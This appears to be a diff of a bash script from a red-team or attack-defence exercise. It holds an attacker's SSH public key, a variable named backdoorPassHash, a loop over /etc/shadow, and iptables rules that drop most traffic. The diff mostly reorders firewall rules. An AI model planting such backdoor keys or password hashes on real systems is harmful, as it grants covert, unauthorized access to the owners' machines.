@@ -1,11 +1,8 @@
 #!/bin/bash
 
 # BEFORE RUNNING: 
-# 1. set the attackerIP variable to the IP of the attacker machine
-# 2. set the allowedPorts variable to the ports that should be allowed for the service
 # 3. generate an ssh key on the kali box and copy it out
 
-attackerIP=192.168.1.15
 publicKey="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEtQ2rUqoG7+G3LUYwLCJOar008UlilwucCskQ9i8/8RsVnI3mJ59aWD7HP7yMshK+i6wXjbWDak5NX0KFQvZXLHFp+V5Qp5fD10gFEDaqfhf2CTepeCy50/1TTuCK/Q1EzGgjh3c+yDj1v7POR1uxIXPpnpmu3P9S8tOYDDC2pimmEqjMwq29Gjotlu+BS4ZTjH9dkbFlkoF3resrnyY+BztIAv/KUbQWP70+1xI73tFK9ubzpJi0Dcg3IfwdmEUtI8BbnF4q4/8pIObuzHfxnpe3/FTGp4tibYRsqTxdlckIFAcfI1SgZPnXyzaVDwH4HU4Seh4u+je3mAer5qK1pITLC7dgWt/+cpnLJ/2dXEJowuia8C3YZCJX21gyFPub3doCKqgQ/SmGi8IfDIWfm35YT7mU3862XC3bYrOqzKhvwA0lT69S8s4RtKkPKvWRJphGFwuuSrZOyfIP4Ew1EHScg4CzX4juUc1mU5Tmd7HWOTpBpHpfIn89bNle/eU= emile@EMILE-LT-UBU"
 scorebotUser="scorebot"
 backdoorPassHash='$6$j8vzzMPeNMxOBoNf$B6Pb78gRwsaCxEx8zzEwG2bos08U3tEkXL1aryHd5iUy9iq0VgFxzFafqQezxFhFNBAY0Q0LmAUIUd2uDkm3A/'
@@ -40,22 +37,25 @@ done < /etc/shadow
 
 iptables -F 
 iptables -X
-# chains=$(iptables -L | grep Chain | cut  --delimiter=" " --fields=2)
-# for chain in $chains
-# do
-#     iptables --policy $chain DROP
-# done
 
-iptables --policy INPUT DROP
+# allow established connections
+iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
+iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
 
 for port in "${allowedInboundPorts[@]}"; do
     iptables -A INPUT -p tcp --dport $port -j ACCEPT
     iptables -A OUTPUT -p tcp --dport $port -j ACCEPT
+    iptables -A OUTPUT -o eth0 -p tcp --dport $port -j ACCEPT
 done
-
 
 iptables -I INPUT -p icmp --icmp-type echo-request -j DROP
 ip6tables -I INPUT -p ipv6-icmp --icmpv6-type echo-request -j DROP
+
+chains=$(iptables -L | grep Chain | cut  --delimiter=" " --fields=2)
+for chain in $chains
+do
+    iptables --policy $chain DROP
+done
 
 iptables-save
 
